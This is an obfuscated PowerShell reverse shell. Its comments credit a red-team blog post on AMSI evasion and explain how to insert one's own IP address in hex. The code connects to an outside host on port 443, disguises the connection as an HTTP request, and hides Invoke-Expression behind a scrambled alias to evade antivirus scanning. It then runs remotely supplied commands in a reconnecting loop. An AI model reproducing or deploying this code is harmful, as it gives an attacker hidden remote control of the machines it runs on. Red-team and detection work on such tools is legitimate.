<# See original code source at:
https://0xdarkvortex.dev/index.php/2019/07/17/red-team-ttps-part-1-amsi-evasion/.
Written by paranoidninja. #>

<# To get the code working, edit the $px 
parameter with your IP address converted to hex.
printf “%x,%x,%x,%x” 10 10 10 10 #>

while ($true) {$px = "12","dc","5e","7";$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.';$w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n";$s = [System.Text.ASCIIEncoding];[byte[]]$b = 0..65535|%{0};$x = "n-eiorvsxpk5";Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);$y = New-Object System.Net.Sockets.TCPClient($p,443);$z = $y.GetStream();$d = $s::UTF8.GetBytes($w);$z.Write($d, 0, $d.Length);$t = (n-eiorvsxpk5 whoami) + "$ ";while(($l = $z.Read($b, 0, $b.Length)) -ne 0){;$v = (New-Object -TypeName $s).GetString($b,0, $l);$d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t);$z.Write($d, 0, $d.Length);}$y.Close();Start-Sleep -Seconds 5}
